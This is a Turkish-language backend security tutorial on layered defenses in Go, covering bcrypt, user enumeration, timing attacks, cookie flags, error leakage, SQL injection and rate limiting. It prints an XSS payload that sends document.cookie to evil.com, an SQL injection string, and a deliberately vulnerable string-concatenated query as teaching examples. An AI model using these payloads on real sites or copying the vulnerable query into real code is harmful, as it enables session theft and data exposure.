# Backend Güvenlik: Defense in Depth

## Felsefe

**Tek bir güvenlik mekanizmasına güvenme.** Birden çok katman koy,
biri delinirse diğeri yakalasın. Buna **Defense in Depth** (Katmanlı
Savunma) denir.

## 1. Şifre Saklama: bcrypt

```go
const bcryptCost = 14
hashed, _ := bcrypt.GenerateFromPassword([]byte(password), bcryptCost)
```

### Neden Hızlı Hash Değil (MD5, SHA-256)?

Şifre hash'i **kasıtlı yavaş** olmalı. Eğer DB sızdırılırsa saldırgan
brute-force denemesi:

| Hash            | 1 milyar deneme süresi |
|-----------------|------------------------|
| MD5             | ~saniyeler             |
| SHA-256         | ~dakikalar             |
| bcrypt(cost=12) | ~yıllar                |
| bcrypt(cost=14) | ~on yıllar             |

Cost her artırıldığında süre 2'ye katlanır. Donanım hızlandıkça
cost'u artırırsın.

## 2. User Enumeration Saldırısı

Saldırgan login formuna `target@gmail.com` yazar. Sistem ne diyor?

❌ **Kötü**: "Bu email kayıtlı değil" → email sistemde yok bilgisi
❌ **Kötü**: "Şifre yanlış" → email sistemde **var** bilgisi

✅ **İyi**: "Geçersiz kimlik bilgisi" (her durumda)

Saldırgan bu bilgiyi öğrenirse:
- Phishing için target listesi yapar
- Sızdırılmış başka şifreleri burada dener (credential stuffing)

## 3. Timing Attack

Mesajları aynı yapsan bile **cevap süresi** ele verebilir:

```go
// NAİF
if !userExists {
    return "Geçersiz"  // ~5ms (DB sorgusu yok)
}
if wrongPassword {
    return "Geçersiz"  // ~250ms (bcrypt çalıştı)
}
```

Saldırgan response time'a bakar:
- 5ms → user yok
- 250ms → user var, şifre yanlış

### Çözüm: Sahte İş

```go
case errors.Is(err, gorm.ErrRecordNotFound):
    // User yok ama bcrypt'i yine de çalıştır → süre aynı kalsın
    _ = bcrypt.CompareHashAndPassword(h.dummyHash, []byte(password))
    return httpx.ErrInvalidCredentials
```

`dummyHash` boot'ta üretilmiş sahte bir hash. User olmasa bile
bcrypt çalışır → cevap süresi normal user ile aynı.

## 4. Cookie Güvenlik Flag'leri

```go
c.Cookie(&fiber.Cookie{
    Name:     "jwt",
    Value:    token,
    HTTPOnly: true,
    Secure:   true,
    SameSite: "Lax",
})
```

| Flag            | Engellediği saldırı                          |
|-----------------|----------------------------------------------|
| `HTTPOnly`      | XSS — JS ile cookie okunamaz                 |
| `Secure`        | Sniffing — sadece HTTPS'te gönderilir        |
| `SameSite: Lax` | CSRF — 3rd-party site cookie'yi tetikleyemez |

### XSS (Cross-Site Scripting)

Saldırgan kötü niyetli JS enjekte eder (yorum alanı, vs):

```javascript
fetch('https://evil.com/steal?c=' + document.cookie)
```

`HTTPOnly: true` → `document.cookie` JWT'yi göremez.

### CSRF (Cross-Site Request Forgery)

Saldırganın sitesinde:

```html

```

Kullanıcı bankada login'liyse cookie otomatik gider, transfer olur.

`SameSite: Lax` → cookie sadece kullanıcının kendi sitesinden gelen
isteklerde gönderilir, başka siteden tetiklenen istekte gönderilmez.

## 5. Hata Mesajlarında Bilgi Sızıntısı

```go
case errors.Is(err, gorm.ErrDuplicatedKey):
    return httpx.ErrConflict  // generic "kayıt mevcut"
```

❌ Spesifik: "Bu email zaten kayıtlı" → enumeration zafiyeti
✅ Generic: "Kayıt mevcut bir kayıtla çakışıyor" → hangi alan belli değil

```go
case err != nil:
    return httpx.ErrInternal.WithErr(err)  // generic 500
```

Ham DB hatasını response'a koyma. "Table 'users' doesn't exist" gibi
mesaj iç yapıyı sızdırır. Sunucu log'unda dur, kullanıcıya generic 500.

## 6. SQL Injection: Parametreli Sorgu

```go
// ✅ DOĞRU: parametreli
db.Where("email = ?", req.Email).First(&user)

// ❌ TEHLİKELİ: string birleştirme
db.Where("email = '" + req.Email + "'").First(&user)
```

İkincisinde `req.Email = "x' OR '1'='1"` saldırısı tüm tabloyu döker.

GORM ve standart `database/sql` parametreli sorguyu zaten kullanır,
sadece manuel string concat yapma.

## 7. Validation: Input Asla Güvenilmez

```go
type RegisterRequest struct {
    Email string `validate:"required,email,max=255"`
    Age   int    `validate:"gte=0,lte=150"`
}
```

Frontend'in validation yapması yeterli değil — saldırgan curl/Postman
ile direkt API'ye istek atabilir. Backend her zaman doğrulamalı.

## 8. Rate Limiting

Kodda yok ama olmalı: aynı IP'den 5 dakikada 100'den fazla login
denemesi → bloke. Brute-force'u yavaşlatır.

## Katmanlı Savunma Tablosu

| Saldırı          | Katman 1           | Katman 2                   |
|------------------|--------------------|----------------------------|
| Brute-force      | Rate limiting      | bcrypt cost=14             |
| User enumeration | Generic mesaj      | Sabit timing (dummy hash)  |
| XSS              | Input sanitization | HTTPOnly cookie            |
| CSRF             | CSRF token         | SameSite cookie            |
| SQL injection    | Parametreli sorgu  | ORM kullanımı              |
| MITM             | HTTPS              | Secure cookie              |
| Şifre sızıntısı  | bcrypt hash        | Cost=14 (yavaş)            |
| Bilgi sızıntısı  | Generic 500        | Production'da debug kapalı |

Her saldırının **iki savunması** var. Birini atlatsa diğerine takılır.

## Tek Cümle

Backend güvenliği tek bir mekanizmaya değil, üst üste binmiş katmanlara
dayanır: bcrypt + generic mesajlar + sabit timing + cookie flag'leri +
parametreli sorgu + validation + rate limit; her saldırı türü için en
az iki savunma olmalı, biri delinirse diğeri yakalasın.